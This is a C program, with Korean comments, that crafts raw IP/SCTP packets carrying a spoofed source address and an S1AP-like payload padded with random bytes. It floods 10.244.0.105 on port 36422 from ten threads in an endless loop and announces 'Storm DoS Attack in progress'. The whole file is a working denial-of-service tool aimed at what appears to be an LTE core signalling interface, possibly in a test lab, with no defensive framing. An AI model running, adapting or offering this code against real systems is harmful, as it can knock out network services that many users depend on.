#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

#define IP_HDR_LEN sizeof(struct iphdr)
#define SCTP_HDR_LEN 12
#define MIN_PAYLOAD_SIZE 1300
#define MAX_PAYLOAD_SIZE 1350

const char *dst_ip = "10.244.0.105";
const int dst_port = 36422;
const char *src_ip = "10.244.0.1";
const int src_port = 49783;

struct sctphdr {
    unsigned short source;
    unsigned short dest;
    unsigned int vtag;
    unsigned int checksum;
};

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *send_packets(void *arg) {
    int sockfd;
    struct sockaddr_in dest_addr;
    char packet[IP_HDR_LEN + SCTP_HDR_LEN + MAX_PAYLOAD_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct sctphdr *sctph = (struct sctphdr *)(packet + IP_HDR_LEN);
    char *payload = packet + IP_HDR_LEN + SCTP_HDR_LEN;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP);
    if (sockfd < 0) {
        perror("Socket Creation failed");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Failed to set socket option");
        close(sockfd);
        pthread_exit(NULL);
    }

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(IP_HDR_LEN + SCTP_HDR_LEN + MAX_PAYLOAD_SIZE);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_SCTP;
    iph->check = 0;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);
    iph->check = checksum((unsigned short *)packet, IP_HDR_LEN);

    sctph->source = htons(src_port);
    sctph->dest = htons(dst_port);
    sctph->vtag = htonl(0);
    sctph->checksum = 0;

    const char base_payload[] = 
        "\x00\x05\x40\x81\x8c\x00\x00\x07\x00\x1d\x00\x05\x00\x00\x7b\x00"
        "\x06\x00\x05\x00\x02\x00\x01\x00\x0f\x00\x01\x00\x00\x1b\x00\x02"
        "\x00\x00\x00\x1c\x00\x01\x00\x00\x19\x00\x0f\x0e\x01\x67\x25\xbb"
        "\x86\x00\x02\xf8\x99\x30\xb8\xc6\x14\xe0\x00\x1a\x00\x81\x52\x81"
        "\x50\x06\x00\x00\x40\x03\xe7\x00\x1d\x00\x30\x55\x45\x2e\x52\x4e"
        "\x54\x49\x00\x38\x55\x45\x2e\x49\x4d\x53\x49\x31\x00\x38\x55\x45"
        "\x2e\x49\x4d\x53\x49\x32\x00\x28\x55\x45\x2e\x52\x41\x54\x00\x40"
        "\x55\x45\x2e\x4d\x5f\x54\x4d\x53\x49\x00\x60\x55\x45\x2e\x43\x49"
        "\x50\x48\x45\x52\x5f\x41\x4c\x47\x00\x78\x55\x45\x2e\x49\x4e\x54"
        "\x45\x47\x52\x49\x54\x59\x5f\x41\x4c\x47\x00\x58\x55\x45\x2e\x45"
        "\x4d\x4d\x5f\x43\x41\x55\x53\x45\x00\x78\x55\x45\x2e\x52\x45\x4c"
        "\x45\x41\x53\x45\x5f\x54\x49\x4d\x45\x52\x00\x88\x55\x45\x2e\x45"
        "\x53\x54\x41\x42\x4c\x49\x53\x48\x5f\x43\x41\x55\x53\x45\x00\x18"
        "\x6d\x73\x67\x31\x00\x18\x6d\x73\x67\x32\x00\x18\x6d\x73\x67\x33"
        "\x00\x18\x6d\x73\x67\x34\x00\x18\x6d\x73\x67\x35\x00\x18\x6d\x73"
        "\x67\x36\x00\x18\x6d\x73\x67\x37\x00\x18\x6d\x73\x67\x38\x00\x18"
        "\x6d\x73\x67\x39\x00\x20\x6d\x73\x67\x31\x30\x00\x20\x6d\x73\x67"
        "\x31\x31\x00\x20\x6d\x73\x67\x31\x32\x00\x20\x6d\x73\x67\x31\x33"
        "\x00\x20\x6d\x73\x67\x31\x34\x00\x20\x6d\x73\x67\x31\x35\x00\x20"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x6d\x73\x67\x31\x36\x00\x20\x6d\x73\x67\x31\x37\x00\x20\x6d\x73"
        "\x67\x31\x38\x00\x20\x6d\x73\x67\x31\x39\x00\x20\x6d\x73\x67\x32"
        "\x30\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    int base_payload_size = sizeof(base_payload);  // 실제 페이로드 크기 계산
    memcpy(payload, base_payload, base_payload_size);

    int random_len = MIN_PAYLOAD_SIZE + rand() % (MAX_PAYLOAD_SIZE - MIN_PAYLOAD_SIZE + 1) - base_payload_size;
    for (int j = 0; j < random_len; j++) {
        payload[base_payload_size + j] = rand() % 256;
    }

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = sctph->dest;
    dest_addr.sin_addr.s_addr = iph->daddr;

    // 패킷 전송을 무한 반복
    while (1) {
        if (sendto(sockfd, packet, IP_HDR_LEN + SCTP_HDR_LEN + base_payload_size + random_len, 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Packet send failed");
            close(sockfd);
            pthread_exit(NULL);
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

int main() {
    srand(time(0));
    const int num_threads = 10;
    pthread_t threads[num_threads];

    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, NULL) != 0) {
            perror("Failed to create thread");
            return 1;
        }
    }

    printf("Storm DoS Attack in progress...\n");

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
